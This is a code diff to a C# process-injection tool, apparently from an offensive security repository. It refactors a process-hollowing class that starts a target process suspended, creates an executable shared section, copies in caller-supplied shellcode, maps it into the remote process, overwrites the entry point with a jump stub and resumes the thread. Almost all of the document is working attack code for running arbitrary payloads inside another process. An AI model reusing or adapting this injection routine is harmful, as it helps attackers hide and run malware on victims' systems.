@@ -39,13 +39,13 @@ namespace ProcessInjection
 
         #region Process Hollowing
         [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
-        public static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, MemProtect pageProt, MemAllocation allocationAttribs, IntPtr hFile);
+        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);
 
         [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
         private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);
 
         [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
-        public static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, MemAllocation alloctype, MemProtect prot);
+        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);
 
         [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
         private static extern IntPtr GetCurrentProcess();
@@ -67,6 +67,9 @@ namespace ProcessInjection
 
         [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
         private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
+
+        [DllImport("kernel32.dll")]
+        static extern uint GetLastError();
         #endregion Process Hollowing
 
         //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
@@ -135,7 +138,7 @@ namespace ProcessInjection
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct PROCESS_BASIC_INFORMATION
+        internal struct PROCESS_BASIC_INFORMATION
         {
             public IntPtr Reserved1;
             public IntPtr PebAddress;
@@ -146,26 +149,26 @@ namespace ProcessInjection
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct STARTUPINFO
+        internal struct STARTUPINFO
         {
-            public uint cb;
-            public IntPtr lpReserved;
-            public IntPtr lpDesktop;
-            public IntPtr lpTitle;
-            public uint dwX;
-            public uint dwY;
-            public uint dwXSize;
-            public uint dwYSize;
-            public uint dwXCountChars;
-            public uint dwYCountChars;
-            public uint dwFillAttributes;
-            public uint dwFlags;
-            public ushort wShowWindow;
-            public ushort cbReserved;
-            public IntPtr lpReserved2;
-            public IntPtr hStdInput;
-            public IntPtr hStdOutput;
-            public IntPtr hStdErr;
+            uint cb;
+            IntPtr lpReserved;
+            IntPtr lpDesktop;
+            IntPtr lpTitle;
+            uint dwX;
+            uint dwY;
+            uint dwXSize;
+            uint dwYSize;
+            uint dwXCountChars;
+            uint dwYCountChars;
+            uint dwFillAttributes;
+            uint dwFlags;
+            ushort wShowWindow;
+            ushort cbReserved;
+            IntPtr lpReserved2;
+            IntPtr hStdInput;
+            IntPtr hStdOutput;
+            IntPtr hStdErr;
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -307,6 +310,12 @@ namespace ProcessInjection
             uint rvaEntryOffset_;
             uint size_;
             byte[] inner_;
+            public const uint PageReadWriteExecute = 0x40;
+            public const uint PageReadWrite = 0x04;
+            public const uint PageExecuteRead = 0x20;
+            public const uint MemCommit = 0x00001000;
+            public const uint SecCommit = 0x08000000;
+            public const uint GenericAll = 0x10000000;
             public const uint CreateSuspended = 0x00000004;
             public const uint DetachedProcess = 0x00000008;
             public const uint CreateNoWindow = 0x08000000;
@@ -321,6 +330,8 @@ namespace ProcessInjection
                 return (info.dwPageSize - size % info.dwPageSize) + size;
             }
 
+            const int AttributeSize = 24;
+
             private bool nt_success(long v)
             {
                 return (v >= 0);
@@ -331,20 +342,16 @@ namespace ProcessInjection
                 return GetCurrentProcess();
             }
 
-            private IntPtr GetBuffer()
-            {
-                return localmap_;
-            }
-
 
             public static PROCESS_INFORMATION StartProcess(string binaryPath)
             {
-                uint flags = CreateSuspended | DetachedProcess | CreateNoWindow;
+                uint flags = CreateSuspended;
 
                 STARTUPINFO startInfo = new STARTUPINFO();
                 PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
                 CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);
-                Console.WriteLine($"[+] Process {binaryPath} started in a suspended state.");
+
+                Console.WriteLine($"[+] Process {binaryPath} started with Process ID: {procInfo.dwProcessId}.");
 
                 return procInfo;
             }
@@ -353,37 +360,39 @@ namespace ProcessInjection
             https://github.com/peperunas/injectopi/tree/master/CreateSection
             Attemp to create executatble section
             */
-            private bool CreateSection(uint size)
+            public bool CreateSection(uint size)
             {
                 LARGE_INTEGER liVal = new LARGE_INTEGER();
                 size_ = round_to_page(size);
                 liVal.LowPart = size_;
 
-                var status = ZwCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, MemProtect.PAGE_EXECUTE_READWRITE, MemAllocation.SecCommit, (IntPtr)0);
+                long status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);
                 Console.WriteLine($"[+] Executable section created.");
                 return nt_success(status);
             }
 
-            private KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, MemProtect protect, IntPtr addr)
+            public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
             {
                 IntPtr baseAddr = addr;
                 IntPtr viewSize = (IntPtr)size_;
 
-                var status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
+                long status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
                 return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
             }
 
-            private void SetLocalSection(uint size)
+            public void SetLocalSection(uint size)
             {
-                var vals = MapSection(GetCurrent(), MemProtect.PAGE_READWRITE, IntPtr.Zero);
+
+                KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
                 Console.WriteLine($"[+] Map view section to the current process: {vals}.");
                 localmap_ = vals.Key;
                 localsize_ = vals.Value;
+
             }
 
-            private void CopyShellcode(byte[] buf)
+            public void CopyShellcode(byte[] buf)
             {
-                var lsize = size_;
+                long lsize = size_;
                 Console.WriteLine($"[+] Copying Shellcode into section: {lsize}. ");
 
                 unsafe
@@ -397,7 +406,7 @@ namespace ProcessInjection
                 }
             }
 
-            private KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
+            public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
             {
                 int i = 0;
                 IntPtr ptr;
@@ -407,15 +416,14 @@ namespace ProcessInjection
 
                 unsafe
                 {
-                    
-                    var p = (byte*)ptr;
+                    byte* p = (byte*)ptr;
                     byte[] tmp = null;
 
                     if (IntPtr.Size == 4)
                     {
                         p[i] = 0xb8;
                         i++;
-                        var val = (Int32)dest;
+                        Int32 val = (Int32)dest;
                         tmp = BitConverter.GetBytes(val);
                     }
                     else
@@ -425,7 +433,7 @@ namespace ProcessInjection
                         p[i] = 0xb8;
                         i++;
 
-                        var val = (Int64)dest;
+                        Int64 val = (Int64)dest;
                         tmp = BitConverter.GetBytes(val);
                     }
 
@@ -437,7 +445,6 @@ namespace ProcessInjection
                     i++;
                     p[i] = 0xe0;
                     i++;
-                    
                 }
 
                 return new KeyValuePair<int, IntPtr>(i, ptr);
@@ -461,7 +468,7 @@ namespace ProcessInjection
 
                         byte* entry_ptr = (opthdr + 0x10);
 
-                        var tmp = *((int*)entry_ptr);
+                        int tmp = *((int*)entry_ptr);
 
                         rvaEntryOffset_ = (uint)tmp;
 
@@ -477,16 +484,16 @@ namespace ProcessInjection
                 return res;
             }
 
-            private IntPtr FindEntry(IntPtr hProc)
+            public IntPtr FindEntry(IntPtr hProc)
             {
-                var basicInfo = new PROCESS_BASIC_INFORMATION();
+                PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
                 uint tmp = 0;
 
-                var success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
+                long success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
                 Console.WriteLine($"[+] Locating the module base address in the remote process.");
 
                 IntPtr readLoc = IntPtr.Zero;
-                var addrBuf = new byte[IntPtr.Size];
+                byte[] addrBuf = new byte[IntPtr.Size];
                 if (IntPtr.Size == 4)
                 {
                     readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
@@ -506,6 +513,7 @@ namespace ProcessInjection
                     readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
 
                 pModBase_ = readLoc;
+
                 ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);
                 Console.WriteLine($"[+] Read the first page and locate the entry point: {readLoc}.");
 
@@ -514,20 +522,23 @@ namespace ProcessInjection
 
             public void MapAndStart(PROCESS_INFORMATION pInfo)
             {
-                var tmp = MapSection(pInfo.hProcess, MemProtect.PAGE_EXECUTE_READ, IntPtr.Zero);
+
+                KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
                 Console.WriteLine($"[+] Locate shellcode into the suspended remote porcess: {tmp}.");
 
                 remotemap_ = tmp.Key;
                 remotesize_ = tmp.Value;
 
-                var patch = BuildEntryPatch(tmp.Key);
+                KeyValuePair<int, IntPtr> patch = BuildEntryPatch(tmp.Key);
 
                 try
                 {
-                    var pSize = (IntPtr)patch.Key;
+
+                    IntPtr pSize = (IntPtr)patch.Key;
                     IntPtr tPtr = new IntPtr();
 
                     WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);
+
                 }
                 finally
                 {
@@ -535,26 +546,31 @@ namespace ProcessInjection
                         Marshal.FreeHGlobal(patch.Value);
                 }
 
-                var tbuf = new byte[0x1000];
-                var nRead = new IntPtr();
-
+                byte[] tbuf = new byte[0x1000];
+                IntPtr nRead = new IntPtr();
                 ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);
-                var res = ResumeThread(pInfo.hThread);
+
+                uint res = ResumeThread(pInfo.hThread);
                 Console.WriteLine($"[+] Process has been resumed.");
+
+            }
+
+            public IntPtr GetBuffer()
+            {
+                return localmap_;
             }
 
             ~ProcHollowing()
-           {
+            {
                 if (localmap_ != (IntPtr)0)
-                   ZwUnmapViewOfSection(section_, localmap_);
+                    ZwUnmapViewOfSection(section_, localmap_);
             }
 
             public void Hollow(string binary, byte[] shellcode)
             {
-                var pinf = StartProcess(binary);
-
-                FindEntry(pinf.hProcess);
+                PROCESS_INFORMATION pinf = StartProcess(binary);
                 CreateSection((uint)shellcode.Length);
+                FindEntry(pinf.hProcess);
                 SetLocalSection((uint)shellcode.Length);
                 CopyShellcode(shellcode);
                 MapAndStart(pinf);
